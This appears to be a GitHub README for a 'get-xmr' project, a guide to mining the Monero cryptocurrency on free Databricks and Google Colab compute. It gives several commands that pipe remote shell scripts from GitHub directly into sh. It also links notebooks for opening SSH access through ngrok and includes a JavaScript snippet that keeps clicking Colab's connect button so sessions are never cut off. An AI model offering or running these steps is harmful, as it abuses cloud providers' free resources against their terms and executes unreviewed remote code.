# Edit + Copy + Paste 👉🏻 [Click here for Tutorial](https://aank.me/Youtube)
* Try Free [Databricks Community Edition](https://databricks.com/)
```markdown
cd /root
screen -R xmr
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
```
* Try Free [XRDP GColab](https://colab.research.google.com/drive/1b1qhBUk4nXU6oriQv6VdcpKhSZqxlomc?usp=sharing)
```markdown
screen -R xmr
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
```
```markdown
screen -R xmr
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-us.sh | sh
```
```markdown
screen -R xmr
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/nvidiacolab-us.sh | sh
```
* Try Free [40 CPU GColab to get XMR](https://colab.research.google.com/github/a2nk/get-xmr/blob/main/40CPU_getXMR.ipynb)
 
* Try Free [GPU Check](https://colab.research.google.com/github/a2nk/get-xmr/blob/main/SSH_GPU_CHECK.ipynb)

* Try Free [SSH Using Ngrok](https://colab.research.google.com/github/a2nk/get-xmr/blob/main/NGROK-SSH.ipynb)

* Auto Reconnect GColab:
```markdown
var startClickConnect = function startClickConnect(){ var clickConnect = function clickConnect(){ console.log("Connnect Clicked - Start"); document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click(); console.log("Connnect Clicked - End"); }; var intervalId = setInterval(clickConnect, 60000); var stopClickConnectHandler = function stopClickConnect() { console.log("Connnect Clicked Stopped - Start"); clearInterval(intervalId); console.log("Connnect Clicked Stopped - End"); }; return stopClickConnectHandler; }; var stopClickConnect = startClickConnect();
```
